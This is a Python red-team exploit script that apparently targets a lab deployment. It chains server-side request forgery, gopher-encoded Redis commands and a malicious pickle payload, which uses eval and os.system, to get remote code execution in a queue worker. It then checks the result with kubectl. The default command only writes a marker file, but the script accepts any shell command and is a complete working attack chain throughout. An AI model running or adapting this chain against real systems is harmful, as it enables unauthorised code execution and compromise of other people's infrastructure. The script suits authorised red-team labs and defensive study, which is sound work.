import argparse
import pickle
import subprocess
import urllib.parse

import requests


class RCEPayload:
    def __init__(self, command: str):
        self.command = command

    def __reduce__(self):
        expression = f"__import__('os').system({self.command!r})"
        return (eval, (expression,))


def build_resp_command(parts: list[bytes]) -> bytes:
    frame = [f"*{len(parts)}\r\n".encode("utf-8")]
    for part in parts:
        frame.append(f"${len(part)}\r\n".encode("utf-8"))
        frame.append(part)
        frame.append(b"\r\n")
    return b"".join(frame)


def send_redis_via_ssrf(web_base_url: str, redis_host: str, redis_port: int, command: bytes) -> requests.Response:
    gopher_url = (
        f"gopher://{redis_host}:{redis_port}/_"
        f"{urllib.parse.quote_from_bytes(command, safe='')}"
    )
    return requests.get(
        f"{web_base_url.rstrip('/')}/fetch",
        params={"url": gopher_url},
        timeout=10,
    )


def verify_marker_with_kubectl(namespace: str, marker_path: str) -> tuple[bool, str]:
    result = subprocess.run(
        [
            "kubectl",
            "-n",
            namespace,
            "exec",
            "deploy/worker-vulnerable",
            "--",
            "cat",
            marker_path,
        ],
        capture_output=True,
        text=True,
        check=False,
    )

    if result.returncode != 0:
        return False, result.stderr.strip() or result.stdout.strip()
    return True, result.stdout.strip()


def main() -> None:
    parser = argparse.ArgumentParser(description="Red team attack: SSRF -> Redis poison -> pickle RCE")
    parser.add_argument("--web-base-url", default="http://localhost:5000", help="Vulnerable web URL")
    parser.add_argument("--redis-host", default="redis", help="Redis host visible from web pod")
    parser.add_argument("--redis-port", type=int, default=6379)
    parser.add_argument("--queue", default="mail_jobs_vuln", help="Target Redis queue")
    parser.add_argument(
        "--rce-command",
        default="sh -c 'echo REDTEAM_OWNED > /tmp/redteam_owned.txt'",
        help="Command executed inside vulnerable worker",
    )
    parser.add_argument("--verify-k8s", action="store_true", help="Check marker file in worker-vulnerable pod")
    parser.add_argument("--namespace", default="redis-injection-lab")
    parser.add_argument("--marker-path", default="/tmp/redteam_owned.txt")
    args = parser.parse_args()

    malicious_pickle = pickle.dumps(RCEPayload(args.rce_command), protocol=4)
    lpush_command = build_resp_command([b"LPUSH", args.queue.encode("utf-8"), malicious_pickle])

    response = send_redis_via_ssrf(
        web_base_url=args.web_base_url,
        redis_host=args.redis_host,
        redis_port=args.redis_port,
        command=lpush_command,
    )

    print("[red-team] SSRF request status:", response.status_code)
    print("[red-team] SSRF response body:", response.text)

    llen_command = build_resp_command([b"LLEN", args.queue.encode("utf-8")])
    llen_response = send_redis_via_ssrf(
        web_base_url=args.web_base_url,
        redis_host=args.redis_host,
        redis_port=args.redis_port,
        command=llen_command,
    )
    print("[red-team] Queue depth query status:", llen_response.status_code)
    print("[red-team] Queue depth query body:", llen_response.text)

    if args.verify_k8s:
        ok, output = verify_marker_with_kubectl(args.namespace, args.marker_path)
        if ok:
            print(f"[red-team] Marker file detected at {args.marker_path}: {output}")
        else:
            print("[red-team] Could not verify marker via kubectl:", output)


if __name__ == "__main__":
    main()
